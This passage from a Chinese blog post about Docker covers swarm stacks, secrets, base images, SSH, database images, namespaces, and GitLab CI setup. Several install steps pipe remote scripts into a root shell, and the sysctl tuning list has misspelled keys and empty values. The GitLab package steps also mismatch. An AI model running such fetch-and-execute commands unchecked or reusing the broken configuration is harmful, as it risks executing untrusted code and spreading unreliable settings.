class="attr">deploy:</span></span><br><span class="line">      <span class="attr">mode:</span> <span class="string">replicated</span></span><br><span class="line">      <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">      <span class="attr">labels:</span> [<span class="string">APP=VOTING</span>]</span><br><span class="line">      <span class="attr">restart_policy:</span></span><br><span class="line">        <span class="attr">condition:</span> <span class="string">on-failure</span></span><br><span class="line">        <span class="attr">delay:</span> <span class="string">10s</span></span><br><span class="line">        <span class="attr">max_attempts:</span> <span class="number">3</span></span><br><span class="line">        <span class="attr">window:</span> <span class="string">120s</span></span><br><span class="line">      <span class="attr">placement:</span></span><br><span class="line">        <span class="attr">constraints:</span> [<span class="string">node.role</span> <span class="string">==</span> <span class="string">manager</span>]</span><br><span class="line"></span><br><span class="line">  <span class="attr">db:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">postgres:9.4</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">db-data:/var/lib/postgresql/data</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">backend</span></span><br><span class="line">    <span class="attr">deploy:</span></span><br><span class="line">      <span class="attr">placement:</span></span><br><span class="line">        <span class="attr">constraints:</span> [<span class="string">node.role</span> <span class="string">==</span> <span class="string">manager</span>]</span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">frontend:</span></span><br><span class="line">  <span class="attr">backend:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="attr">db-data:</span></span><br></pre></td></tr></table></figure>

<p>使用docker compose脚本搭建的集群，需要脚本中包含deploy属性，并使用docker stack使用与更新服务：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 部署服务</span></span><br><span class="line">docker stack deploy example --compose-file=docker-compose.yml</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看服务</span></span><br><span class="line">docker stack <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看服务情况</span></span><br><span class="line">docker stack services example</span><br></pre></td></tr></table></figure>

<p>最后删除服务：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker stack <span class="built_in">rm</span> example</span><br></pre></td></tr></table></figure>

<p>另外推荐一个服务<code>visualizer</code>，可以可视化查看集群中每个虚拟机上的容器状况。</p>
<p>如果更新服务，可以直接修改docker compose文件，然后重新部署：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker stack deploy example --compose-file=docker-compose.yml</span><br></pre></td></tr></table></figure>

<h3 id="Secret-管理"><a href="#Secret-管理" class="headerlink" title="Secret 管理"></a>Secret 管理</h3><p>在生产环境中，用于管理系统的密码一般不会明文写到docker compose中，而是使用一些手段隐藏起来。</p>
<p>因此用到Secret管理。这里的Secret管理主要包括：</p>
<ul>
<li>用户名&#x2F;密码</li>
<li>SSH Key</li>
<li>TLS 认证</li>
<li>机密数据</li>
</ul>
<p>在Manager节点中，有一个内置的分布式存储。在这个存储中我们就可以存储我们的Secret。当Worker上有容器想要使用时，就可以请求分布式存储获取Secret。</p>
<p>首先创建一个文件<code>password.txt</code>，将我们的密码写到这个文件中。创建一个Secret：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker secret create demo-password password.txt</span><br></pre></td></tr></table></figure>

<p>之后删掉<code>password.txt</code>。</p>
<p>查看创建的Secret：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker secret <span class="built_in">ls</span></span><br></pre></td></tr></table></figure>

<p>不创建文件而直接创建Secret也可以，通过管道的方式即可：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;admin123456&quot;</span> | docker secret create demo-password2</span><br></pre></td></tr></table></figure>

<p>删除Secret可以：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker secret <span class="built_in">rm</span> demo-password2</span><br></pre></td></tr></table></figure>

<p>使用Secret：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker service create --name client --secret demo-secret busybox sh -c &quot;while true;do sleep 3600;done&quot;</span><br></pre></td></tr></table></figure>

<p>在容器的<code>/run/secrets/</code>下可以看到刚刚的secret，是可以看到密码原文的。在MySQL中，可以使用<code>MYSQL_ROOT_PASSWORD_FILE</code>指定密码文件。</p>
<p>在compose中也可以使用Secret。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span> </span><br><span class="line">  <span class="attr">image:</span> <span class="string">mysql</span></span><br><span class="line">  <span class="attr">secrets:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="string">demo-password</span></span><br><span class="line">  <span class="attr">environment:</span></span><br><span class="line">    <span class="attr">MYSQL_ROOT_PASSWORD_FILE:</span> <span class="string">/run/secrets/demo-password</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">mysql-data:/var/lib/mysql</span></span><br><span class="line"></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="attr">mysql-data:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不推荐下面的创建方法，而是推荐命令行管道方式创建Secrets</span></span><br><span class="line"><span class="attr">secrets:</span></span><br><span class="line">  <span class="attr">demo-password:</span></span><br><span class="line">    <span class="attr">file:</span> <span class="string">./password</span></span><br></pre></td></tr></table></figure>




<h2 id="Docker-开发"><a href="#Docker-开发" class="headerlink" title="Docker 开发"></a>Docker 开发</h2><h3 id="系统镜像"><a href="#系统镜像" class="headerlink" title="系统镜像"></a>系统镜像</h3><h4 id="BusyBox"><a href="#BusyBox" class="headerlink" title="BusyBox"></a>BusyBox</h4><p>包含常用命令，体积小于2MB。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker pull busybox</span><br><span class="line">docker run -it busybox</span><br></pre></td></tr></table></figure>

<h4 id="Alpine"><a href="#Alpine" class="headerlink" title="Alpine"></a>Alpine</h4><p>面向安全的轻型Linux发行版，大小仅5MB左右，还包括了APK包管理器。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run alpine /bin/bash</span><br></pre></td></tr></table></figure>

<p>包管理器使用：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apk add --no-cache &lt;package&gt;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;http://dl-4.alpinelinux.org/alpine/dege/testing&quot;</span> &gt;&gt; /etc/apk/repositories</span><br><span class="line">apk --update add --no-cache &lt;package&gt;</span><br></pre></td></tr></table></figure>

<p>包名可以到<a href="https://pkgs.alpinelinux.org/packages">该网站</a>查阅。</p>
<h4 id="Debian-Ubuntu"><a href="#Debian-Ubuntu" class="headerlink" title="Debian &#x2F; Ubuntu"></a>Debian &#x2F; Ubuntu</h4><p>非常适合研发场景，支持多种计算机系统结构。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -it debian bash</span><br></pre></td></tr></table></figure>

<p>另外还有 CentOS Fedora 等。</p>
<h3 id="添加SSH服务"><a href="#添加SSH服务" class="headerlink" title="添加SSH服务"></a>添加SSH服务</h3><p>使用Commit创建</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -it ubuntu</span><br><span class="line"><span class="comment"># 进入容器</span></span><br><span class="line">apt-get update</span><br><span class="line">vi /etc/apt/sources.list.d/163.list</span><br><span class="line"><span class="comment"># 添加 163 镜像源</span></span><br><span class="line">apt-get update</span><br><span class="line"><span class="comment"># 安装 ssh 服务</span></span><br><span class="line">apt-get install openssh-server</span><br><span class="line"><span class="built_in">mkdir</span> -p /var/run/sshd</span><br><span class="line">/usr/sbin/sshd -D &amp;</span><br><span class="line"><span class="comment"># 查看端口</span></span><br><span class="line">netstat -tunlp</span><br><span class="line"><span class="comment"># 取消pam登录限制</span></span><br><span class="line">sed -ri <span class="string">&#x27;s/session required pam_loginuid.so/#session required pam_loginuid.so/g&#x27;</span> /etc/pam.d/sshd</span><br><span class="line"><span class="comment"># 复制主机上的公钥到容器 ssh-keygen -t rsa</span></span><br><span class="line"><span class="built_in">mkdir</span> root/.ssh</span><br><span class="line">vi /root/.ssh/authorized_keys</span><br><span class="line"><span class="comment"># 创建SSH启动脚本</span></span><br><span class="line">vi /run.sh</span><br><span class="line"><span class="built_in">chmod</span> +x run.sh</span><br><span class="line"><span class="comment"># 内容如下</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">/usr/sbin/sshd -D</span><br><span class="line"><span class="comment"># 退出容器</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="comment"># 提交容器 作为新镜像</span></span><br><span class="line">docker commit container_id sshd:ubuntu</span><br></pre></td></tr></table></figure>

<p>使用Dockerfile创建</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建工作目录</span></span><br><span class="line"><span class="built_in">mkdir</span> sshd_ubuntu</span><br><span class="line"><span class="built_in">cd</span> sshd_ubuntu</span><br><span class="line"><span class="comment"># 创建Dockerfile</span></span><br><span class="line"><span class="built_in">touch</span> Dockerfile run.sh</span><br><span class="line"><span class="comment"># Dockerfile</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">/usr/sbin/sshd -D</span><br><span class="line"><span class="comment"># 复制公钥过来</span></span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/id_rsa.pub &gt; authorized_keys</span><br><span class="line"><span class="comment"># 编写Dockerfile</span></span><br></pre></td></tr></table></figure>

<h3 id="Web-服务"><a href="#Web-服务" class="headerlink" title="Web 服务"></a>Web 服务</h3><h4 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h4><p>官方Apache不带PHP，如果需要，可以到<a href="https://registry.hub.docker.com/_/php">该网站</a>查询： <code>7.0.7-apache</code></p>
<p>编写Dockerfile</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> httpd:<span class="number">2.4</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./public-html /usr/local/apache2/htdocs/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>编译镜像</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker build -t apache2-image .</span><br></pre></td></tr></table></figure>

<p>基于 Ubuntu Debian 的配置</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 时区</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;Asia/Shanghai&quot;</span> &gt; /etc/timezone </span></span><br><span class="line"><span class="comment"># 相关环境变量</span></span><br><span class="line"><span class="keyword">ENV</span> APACHE_RUN_USER www-data</span><br><span class="line"><span class="keyword">ENV</span> APACHE_RUN_GROUP www-data</span><br><span class="line"><span class="keyword">ENV</span> APACHE_LOG_DIR /var/log/apache2</span><br><span class="line"><span class="keyword">ENV</span> APACHE_PID_FILE /var/<span class="keyword">run</span><span class="language-bash">/apache2.pid</span></span><br><span class="line"><span class="keyword">ENV</span> APACHE_RUN_DIR /var/<span class="keyword">run</span><span class="language-bash">/apache2</span></span><br><span class="line"><span class="keyword">ENV</span> APACHE_LOCK_DIR /var/lock/apache2</span><br><span class="line"><span class="keyword">ENV</span> APACHE_SERVERADMIN admin@localhost</span><br><span class="line"><span class="keyword">ENV</span> APACHE_SERVERNAME localhost</span><br><span class="line"><span class="keyword">ENV</span> APACHE_SERVERALIAS docker.localhost</span><br><span class="line"><span class="keyword">ENV</span> APACHE_DOCUMENTROOT /var/www</span><br></pre></td></tr></table></figure>

<h4 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h4><p>使用 Docker-compose</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">web:</span></span><br><span class="line">  <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">./nginx.conf:/etc/nginx/nginx.conf:ro</span></span><br><span class="line">  <span class="attr">command:</span> [<span class="string">nginx-debug</span>, <span class="string">&#x27;-g&#x27;</span>, <span class="string">&#x27;daemon off&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>针对Nginx服务器的内核优化命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kernel.sysrq = 0</span><br><span class="line">kernel.core_uses_pid = 1</span><br><span class="line">kernel.ms-nb = 65536</span><br><span class="line">kernel.ms-ax = 65536</span><br><span class="line">kernel.shmmax = 68719476736</span><br><span class="line">kernel.shmall = 4294967296</span><br><span class="line">net.ipv4.ip_forward = 0</span><br><span class="line">net.ipv4.conf.default.rp_filter = 1</span><br><span class="line">net.ipv4.conf.default.accept_source_route = 0</span><br><span class="line">net.ipv4.tcp_syncookies = 1</span><br><span class="line">net.ipv4.tcp_max_tx_buckets = 6000</span><br><span class="line">net.ipv4.tcp_sack = 1</span><br><span class="line">net.ipv4.tcp_window_scaling = 1</span><br><span class="line">net.ipv4.tcp_rmem = 4096 87380 41494304</span><br><span class="line">net.ipv4.tcp_wmem = 4096 16384 41494304</span><br><span class="line">net.ipv4.tcp_max_orphans = </span><br><span class="line">net.ipv4.tcp_max_syn_backlog = </span><br><span class="line">net.ipv4.tcp_timestamps = </span><br><span class="line">net.ipv4.tcp_synack_retries = </span><br><span class="line">net.ipv4.tcp_syn_retries = </span><br><span class="line">net.ipv4.tcp_tw_recycle = </span><br><span class="line">net.ipv4.tcp_tw_reuse = </span><br><span class="line">net.ipv4.tcp_mem = </span><br><span class="line">net.ipv4.tcp_fin_timeout = </span><br><span class="line">net.ipv4.tcp_keepalive_time = </span><br><span class="line">net.ipv4.ip_local_port_range = </span><br><span class="line">net.core.rmem_default = </span><br><span class="line">net.core.wmem_default = </span><br><span class="line">net.core.rmem_max = </span><br><span class="line">net.core.wmem_max = </span><br><span class="line">net.core.netdev_max_backlog = </span><br><span class="line">net.core.somaxconn = </span><br></pre></td></tr></table></figure>

<h4 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h4><p>实现 Servlet 和 JSP 支持。</p>
<h4 id="Jetty"><a href="#Jetty" class="headerlink" title="Jetty"></a>Jetty</h4><p>实现 Servlet 支持。</p>
<h4 id="LAMP"><a href="#LAMP" class="headerlink" title="LAMP"></a>LAMP</h4><ul>
<li>linode&#x2F;lamp</li>
<li>tutum&#x2F;lamp</li>
</ul>
<h4 id="持续开发与管理"><a href="#持续开发与管理" class="headerlink" title="持续开发与管理"></a>持续开发与管理</h4><p>CI : 持续集成；CD : 持续交付</p>
<p>Jenkins</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -p <span class="string">&quot;8000:8080&quot;</span> -p <span class="string">&quot;50000:50000&quot;</span> -v ~/home:/var/jenkins_home jenkins</span><br></pre></td></tr></table></figure>

<p>GitLab</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run ...</span><br></pre></td></tr></table></figure>


<h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><h4 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h4><p>应用广泛。</p>
<p>查看日志</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker logs mysql_name</span><br></pre></td></tr></table></figure>

<p>自定义配置文件</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 编辑此配置目录 /etc/mysql/conf.d</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL 将结合下面的两个配置启动</span></span><br><span class="line"><span class="comment"># /etc/mysql/my.conf</span></span><br><span class="line"><span class="comment"># /etc/mysql/conf.d/config-file.cnf</span></span><br></pre></td></tr></table></figure>

<p>脱离cnf文件进行配置</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 通过标签flags传递配置选项</span></span><br><span class="line">docker run ... mysql:tag --character-set-server=utf8mb4</span><br></pre></td></tr></table></figure>

<h4 id="Oracle-Database-XE"><a href="#Oracle-Database-XE" class="headerlink" title="Oracle Database XE"></a>Oracle Database XE</h4><p>免费，体机小，配置简单。适用于PHP，JAVA，.NET等。</p>
<h4 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h4><p>一种NoSQL，并提供关系型数据库的绝大部分功能。</p>
<h4 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h4><p>基于内存的数据结构存储系统，用作缓存和消息中间件。</p>
<h4 id="Cassandra"><a href="#Cassandra" class="headerlink" title="Cassandra"></a>Cassandra</h4><p>开源分布式数据库，支持Spark，Storm，Hadoop系统集成，类似与HBase。</p>
<h3 id="分布式处理与大数据平台"><a href="#分布式处理与大数据平台" class="headerlink" title="分布式处理与大数据平台"></a>分布式处理与大数据平台</h3><p>常见工具：</p>
<ul>
<li>Hadoop</li>
<li>Spark</li>
<li>Storm</li>
<li>Elasticsearch</li>
</ul>
<h4 id="Hadoop"><a href="#Hadoop" class="headerlink" title="Hadoop"></a>Hadoop</h4><p>sequenceiq&#x2F;hadoop-docker:2.7.0</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -it sequenceiq/hadoop-docker:2.7.0 /etc/bootstrap.sh -bash</span><br></pre></td></tr></table></figure>

<h4 id="Spark"><a href="#Spark" class="headerlink" title="Spark"></a>Spark</h4><p>sequenceiq&#x2F;spark:1.6.0</p>
<p>基于Scala开发的大数据处理框架。与Hadoop不同的是，Hadoop将数据存储到硬盘上，而Spark存储到内存中。</p>
<p>Spark支持SQL查询，流处理，机器学习(Spark MLlib)，图处理(Spark GraphX)等。支持Scala，Java，Python，Cljure，R等。</p>
<p>还提供其他库，在大数据分析和机器学习领域提供更多功能。</p>
<h4 id="Storm"><a href="#Storm" class="headerlink" title="Storm"></a>Storm</h4><p>baqend&#x2F;storm:3.4.8<br>baqend&#x2F;storm:1.0.0</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/denverdino/docker-storm.git</span><br></pre></td></tr></table></figure>

<p>在Hadoop上加入了实时运算的特性，可以实时处理大数据流。不同于Hadoop和Spark，Storm不进行数据的收集和存储工作，它直接通过网络实时的接受数据并且实时的处理数据，然后直接通过网络实时的传回结果。</p>
<h4 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch"></a>Elasticsearch</h4><p>基于Lucene的开源搜索服务，支持RESTful Web接口。支持实时分布式数据存储和分析查询功能。</p>
<h3 id="编程开发"><a href="#编程开发" class="headerlink" title="编程开发"></a>编程开发</h3><h4 id="C-C"><a href="#C-C" class="headerlink" title="C &#x2F; C++"></a>C &#x2F; C++</h4><ul>
<li>GCC: GNU 开发，跨平台编译器的标准。</li>
<li>LLVM: Low Level Virtual Machine，提供了一套中立的中间代码和编译基础设施，使得优化可以在编译，连接，运行环境中。<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker pull imiell/llvm</span><br></pre></td></tr></table></figure></li>
<li>Clang: 基于LLVM的编译器，兼容GCC并准备超过GCC。特性是快，内存占用小，诊断信息可读性强，模块化设计。<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker pull bowery/clang</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><ul>
<li>OpenJDK: 支持JavaSE。</li>
<li>Spring Boot: 为了简化Spring应用搭建过程，内嵌Tomcat，Jetty，Undertow，提供starter POM，简化Maven配置，无需XML配置。<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/spring-guides/gs-spring-boot-docker.git</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><ul>
<li>PyPy: Python实现的Python解释器和即时编译工具，与CPython完全兼容。可以将Python运行速率提高10倍。</li>
<li>Flask</li>
</ul>
<h4 id="Javascript"><a href="#Javascript" class="headerlink" title="Javascript"></a>Javascript</h4><ul>
<li>NodeJS: 运行于服务端，采用事件驱动模型，提供多种系统级API。</li>
</ul>
<h4 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">go get github.com/golang/example/outyet</span><br></pre></td></tr></table></figure>

<h3 id="Linux-命名空间"><a href="#Linux-命名空间" class="headerlink" title="Linux 命名空间"></a>Linux 命名空间</h3><p>进程命名空间：</p>
<ul>
<li>同一进程，在不同空间下看到的进程号不同。</li>
<li>子空间的进程对父空间可见。</li>
<li>容器只能看到docker-containerd进程及以下的进程。</li>
</ul>
<p>IPC 命名空间：</p>
<ul>
<li>IPC是Linux进程间交互方法：包括信号量，消息队列，共享内存等。</li>
<li>同一IPC命名空间的进程可以彼此交互。</li>
</ul>
<p>网络命名空间：</p>
<ul>
<li>提供完全独立的网络协议栈：网络设备接口，IPv4，IPv6，路由表，防火墙规则，sockets等。</li>
<li>网络命名空间之间通过虚拟网卡连接。</li>
</ul>
<p>挂载命名空间：</p>
<ul>
<li>可以将一个进程的根文件系统限制在某一个目录下。</li>
<li>类似与chroot。</li>
</ul>
<p>UTS命名空间：</p>
<ul>
<li>允许每个容器拥有独立的主机名和域名。</li>
<li>Docker默认指定ID前六字节为主机名。</li>
</ul>
<p>用户命名空间：</p>
<ul>
<li>一个进程在某个用户命名空间内的用户和组 ID 可以与用户命名空间外的不同。</li>
<li>进程在一个用户命名空间外没有特权，但在这个用户命名空间内有 root 特权。</li>
</ul>
<p>控制组：</p>
<ul>
<li>用来对内核资源进行隔离，限制，审计等。</li>
<li>可以限制资源（最大内存），设置优先级，资源审计，隔离，控制等。</li>
</ul>
<h3 id="Linux-网络虚拟化"><a href="#Linux-网络虚拟化" class="headerlink" title="Linux 网络虚拟化"></a>Linux 网络虚拟化</h3><h2 id="运维与监控"><a href="#运维与监控" class="headerlink" title="运维与监控"></a>运维与监控</h2><h3 id="Docker-命令行查看"><a href="#Docker-命令行查看" class="headerlink" title="Docker 命令行查看"></a>Docker 命令行查看</h3><p>查看容器内状况：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker top container_id</span><br></pre></td></tr></table></figure>

<p>查看节点所有容器情况：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker stats</span><br></pre></td></tr></table></figure>

<h3 id="WeaveScope"><a href="#WeaveScope" class="headerlink" title="WeaveScope"></a>WeaveScope</h3><p><a href="https://github.com/weaveworks/scope">WeaveScope Github页面</a></p>
<p>安装过程：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo curl -L git.io/scope -o /usr/local/bin/scope</span><br><span class="line">sudo <span class="built_in">chmod</span> a+x /usr/local/bin/scope</span><br><span class="line">scope launch</span><br></pre></td></tr></table></figure>

<p>打开4040端口的页面，即可看到WeaveScope。通过这个页面，我们可以可视化管理容器。</p>
<p>添加其他节点到监控中，要在两个节点都执行：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">scope launch node_1_ip node_2_ip</span><br></pre></td></tr></table></figure>




<h2 id="DevOps"><a href="#DevOps" class="headerlink" title="DevOps"></a>DevOps</h2><img src="/2020/02/04/%E8%BF%90%E7%BB%B4/Docker/devops.png" class="" title="Dev Ops 架构">

<p>推荐工具：</p>
<ul>
<li>代码管理<ul>
<li>Github</li>
<li>Gitlab</li>
<li>码云</li>
<li>bitbucket</li>
</ul>
</li>
<li>代码持续集成<ul>
<li>TravisCI</li>
<li>GitlabCI</li>
<li>Jenkins</li>
</ul>
</li>
<li>代码测试与检查<ul>
<li>Codecov</li>
<li>SonarQube</li>
</ul>
</li>
</ul>
<h3 id="GitLab"><a href="#GitLab" class="headerlink" title="GitLab"></a>GitLab</h3><p><a href="https://gitlab.com/">GitLab 官网</a></p>
<p><a href="https://packages.gitlab.com/gitlab/gitlab-ce/install">GitLab CE 下载页 Ubuntu</a></p>
<h4 id="Ubuntu-安装-Gitlab"><a href="#Ubuntu-安装-Gitlab" class="headerlink" title="Ubuntu 安装 Gitlab"></a>Ubuntu 安装 Gitlab</h4><p>首先开一台虚拟机，用于安装Gitlab（配置要求：推荐4GB内存）：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装必要扩展程序</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y curl openssh-server ca-certificates</span><br><span class="line"><span class="comment"># 安装邮件提醒工具</span></span><br><span class="line">sudo apt-get install -y postfix</span><br><span class="line"><span class="comment"># 在安装过程中会出现配置页面，选择Internet Site，其他默认</span></span><br></pre></td></tr></table></figure>

<p>下载Gitlab：</p>
<p>安装官方版本：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -s https://packages.gitlab.com/install/repositories/gitlab/gitlab-ce/script.deb.sh | sudo bash</span><br><span class="line">sudo apt-get install gitlab-ee</span><br></pre></td></tr></table></figure>

<p>安装国内镜像版本（仅限Ubuntu 16.04）：<br>在文件<code>/etc/apt/sources.list.d/gitlab-ce.list</code>中写入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/ubuntu xenial main</span><br></pre></td></tr></table></figure>

<p>再安装Gitlab：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置GPG公钥</span></span><br><span class="line">curl https://packages.gitlab.com/gpg.key 2&gt; /dev/null | sudo apt-key add - &amp;&gt;/dev/null</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install gitlab-ce</span><br></pre></td></tr></table></figure>

<p>安装完成后配置GitLab：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置GitLab</span></span><br><span class="line">sudo gitlab-ctl reconfigure</span><br></pre></td></tr></table></figure>

<p>安装完毕后，首次登陆需要设置密码。</p>
<p>配置GitLab，可以到<code>/etc/gitlab/gitlab.rb</code>文件中：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># URL</span></span><br><span class="line">external_url <span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>修改完成后，让配置生效：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo gitlab-ctl reconfigure</span><br></pre></td></tr></table></figure>

<h3 id="GitLab-CI-CD"><a href="#GitLab-CI-CD" class="headerlink" title="GitLab CI&#x2F;CD"></a>GitLab CI&#x2F;CD</h3><p>CI是代码持续化工具，可以在代码提交后自动化执行代码风格检查，单元测试，项目编译等。当然也可以用Jenkins代替。</p>
<h4 id="安装-Runner"><a href="#安装-Runner" class="headerlink" title="安装 Runner"></a>安装 Runner</h4><p>另开一台虚拟机，首先安装Docker：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -sSL https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure>

<p>安装Gitlab CI Runner：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -L https://packages.gitlab.com/install/repositories/runner/gitlab-ci-multi-runner/script.rpm.sh | sudo bash</span><br><span class="line"></span><br><span class="line">sudo apt-get install -y gitlab-ci-multi-runner</span><br></pre></td></tr></table></figure>

<p>检查是否安装成功：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo gitlab-ci-multi-runner status</span><br></pre></td></tr></table></figure>

<p>设置Docker权限：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo gpasswd -a gitlab-runner docker</span><br><span class="line">sudo service docker restart</span><br><span class="line">sudo gitlab-ci-multi-runner restart</span><br></pre></td></tr></table></figure>

<p>注册Runner：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo gitlab-ci-multi-runner register</span><br><span class="line"><span class="comment"># 1. 输入 gitlab_ci 的URL</span></span><br><span class="line"><span class="comment"># 2. 输入gitlab-ci的token</span></span><br><span class="line"><span class="comment"># 2.1 进入gitlab中随便打开一个Repository-&gt;Setting-&gt;CI/CD</span></span><br><span class="line"><span class="comment"># 2.2 进入Runners settings-&gt;Setup a specific Runner manually，复制Token</span></span><br><span class="line"><span class="comment"># 3. 输入描述，保存默认即可</span></span><br><span class="line"><span class="comment"># 4. 输入Runner Tags，例如demo,test等</span></span><br><span class="line"><span class="comment"># 5. 是否Run Untagged builds，false</span></span><br><span class="line"><span class="comment"># 6. 是否Lock Runner to current project，false</span></span><br><span class="line"><span class="comment"># 7. 选择执行器，shell</span></span><br></pre></td></tr></table></figure>

<p>查看Runner：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo gitlab-ci-multi-runner list</span><br></pre></td></tr></table></figure>

<p>回到Gitlab页面，可以看到runner settings里面多了一个runner。</p>
<h4 id="使用-Runner"><a href="#使用-Runner" class="headerlink" title="使用 Runner"></a>使用 Runner</h4><p>一个项目要使用Runner，首先需要在项目下建立文件<code>.gitlab-ci.yml</code>。进入一个项目，选择CI&#x2F;CD-&gt;Pipeline。这时可以看到一个Pipeline。每次提交代码，Pipeline就会自动执行一次，且每一个Stage顺次执行。</p>
<p>使用CI&#x2F;CD可以自动化执行测试、编译、部署等步骤。</p>
